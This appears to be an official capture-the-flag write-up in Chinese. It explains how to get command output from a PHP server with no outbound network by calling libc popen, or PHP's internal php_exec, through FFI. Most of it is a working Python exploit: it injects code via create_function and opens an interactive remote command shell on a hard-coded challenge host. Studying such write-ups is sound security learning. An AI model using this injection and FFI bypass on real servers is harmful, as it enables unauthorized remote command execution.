# FighterFightsInvincibly 官方wp

这里直接丢个exp,考点是无法出网的FFI,如何在执行命令的情况下输出回显.有两种方式,第一种是使用c里的popen,然后从管道中读取结果,一种是FFI中可以直接调用php源码中的函数,php_exec的type为3时对应的是passthru,直接将结果原始输出,当然师傅们也可能有其他的姿势,欢迎分享

```python
import requests

url = "http://173.82.206.142:8004/"

# data = {"fighter": "create_function", "fights": "", "invincibly": """}$e=FFI::cdef("void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);","libc.so.6");$o = $e->popen($_REQUEST['cmd'],"r");$d="";while(($c=$e->fgetc($o))!=-1){$d.=str_pad(strval(dechex($c)),2,"0",0);}$e->pclose($o);echo hex2bin($d);/*"""}
data = {"fighter": "create_function", "fights": "", "invincibly": """}$e=FFI::cdef("int php_exec(int type, char *cmd);");$e->php_exec(3,$_REQUEST['cmd']);/*"""}

while 1:
    cmd = input("cmd:>")
    res = requests.post(url, data=data, params={"cmd": cmd})
    result = res.text.split("-->")[1]
    print(result)

```

